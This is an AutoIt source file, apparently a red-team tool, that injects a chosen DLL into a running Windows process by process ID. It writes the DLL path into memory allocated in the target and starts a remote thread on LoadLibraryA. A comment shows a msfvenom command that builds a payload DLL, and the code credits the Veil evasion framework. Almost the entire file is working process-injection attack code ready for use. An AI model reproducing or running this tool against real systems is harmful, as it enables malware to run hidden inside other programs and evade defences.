#NoTrayIcon
#Region
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion

#include <Process.au3>
#include <Memory.au3>
#include <WinAPI.au3>
#include <String.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Injects a DLL file on disk into a remote process.

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== DLL Injection ===========" & @CRLF & @CRLF)

; DLL file example
; msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f dll > calc.dll

;~ Commandline arguments check
_CheckArguments()

; Check if process is running
_CheckProcess()

; Read DLL file to inject
_ReadDLLFile()

; DLL injection
_DLLInjection()

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckArguments()
    _CheckProcess()
    _ReadDLLFile()
    _DLLInjection()

#ce ----------------------------------------------------------------------------

Func _CheckArguments()

    If $CmdLine[0] <= 0 Then
        ConsoleWrite("[X] You must provide a process ID and DLL file." & @CRLF & @CRLF)
        ConsoleWrite("[i] DLLInjection.exe pid full-path-to-dll" & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] = 1 Then
        ConsoleWrite("[X] You must provide a dll file." & @CRLF & @CRLF)
        ConsoleWrite("[i] DLLInjection.exe pid full-path-to-dll" & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] > 2 Then
        ConsoleWrite("[X] Too many arguments provided." & @CRLF & @CRLF)
        ConsoleWrite("[i] DLLInjection.exe pid full-path-to-dll" & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckArguments

Func _CheckProcess()

    ; Process check
    ConsoleWrite("----- Process Check -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking for target process" & @CRLF & @CRLF)

    Global $targetPID = ProcessExists($CmdLine[1])

    If Not $targetPID = 0 Then
        Global $targetProcName = _ProcessGetName($targetPID)
        ConsoleWrite("[i] Target process is running (" & $targetProcName &")" & @CRLF & @CRLF)

    ElseIf $targetPID = 0 Then
        ConsoleWrite("[X] Target process is not running. Exiting." & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckProcess

Func _ReadDLLFile()

    ; ReadFile
    ConsoleWrite("----- Read DLL file -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking DLL file" & @CRLF & @CRLF)

    Local $DLLFilePath = FileExists($CmdLine[2])

    If Not $DLLFilePath = 0 Then

        Global $DLLFileBytes = StringToBinary($CmdLine[2])
        Global $DLLPathSize = StringLen($CmdLine[2])

        ConsoleWrite("[i] DLL path size: " & $DLLPathSize & " bytes" & @CRLF & @CRLF)
        If $DLLPathSize <= 0 Then
            ConsoleWrite("[X] File appears to be empty. Exiting." & @CRLF & @CRLF)
            Exit
        EndIf

    ElseIf $DLLFilePath = 0 Then
        ConsoleWrite("[X] '" & $CmdLine[2] & "' is not a valid file path." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_ReadDLLFile

Func _DLLInjection()

    ; DLL injection
    ConsoleWrite("----- DLL injection -----" & @CRLF & @CRLF)

    ConsoleWrite("[*] Injecting DLL into PID:" & $targetPID & " (" & $targetProcName &")" & @CRLF & @CRLF)

    ; Adapted from - https://github.com/Veil-Framework/Veil/blob/master/tools/evasion/payloads/autoit/shellcode_inject/flat.py
    ; Credits - ChrisTruncer (https://github.com/ChrisTruncer)
    Local $DLLBuffer = DllStructCreate("byte[" & BinaryLen($DLLFileBytes) & "]")
    DllStructSetData($DLLBuffer, 1, $DLLFileBytes)

    ; OpenProcess
    $hProcess = _WinAPI_OpenProcess( _
        $PROCESS_ALL_ACCESS, _
        0, _
        $targetPID, _
        True)

    ; GetProcAddress
    $hModule = _WinAPI_GetModuleHandle("kernel32.dll")
    $loadLibraryAddr = _WinAPI_GetProcAddress($hModule, "LoadLibraryA")

    ; VirtualAllocEx
    $hRegion = _MemVirtualAllocEx( _
        $hProcess, _
        0, _
        $DLLPathSize, _
        $MEM_COMMIT + $MEM_RESERVE, _
        $PAGE_EXECUTE_READWRITE)

    ; WriteProcessMemory
    Local $written

    _WinAPI_WriteProcessMemory ( _
        $hProcess, _
        $hRegion, _
        _ptr($DLLBuffer), _
        $DLLPathSize, _
        $written)

    ; CreateRemoteThread
    $threadCall = DllCall("Kernel32.dll", "int", "CreateRemoteThread", _
        "ptr", $hProcess, _
        "ptr", 0, _
        "int", 0, _
        "ptr", $loadLibraryAddr, _
        "ptr", $hRegion, _
        "int", 0, _
        "dword*", 0)

    $hThread = $threadCall[0]

EndFunc ;==>_DLLInjection

#cs ----------------------------------------------------------------------------

Util functions:
    _ptr
    sizeof

#ce ----------------------------------------------------------------------------

; Adapted from - https://www.autoitscript.com/forum/topic/95419-injecting-and-executing-code-in-external-process/
; Credits - monoceres (https://www.autoitscript.com/forum/profile/23930-monoceres/)
Func _ptr($s, $e = "")
	If $e <> "" Then Return DllStructGetPtr($s, $e)
	Return DllStructGetPtr($s)
EndFunc   ;==>_ptr

Func sizeof($s)
	Return DllStructGetSize($s)
EndFunc   ;==>sizeof
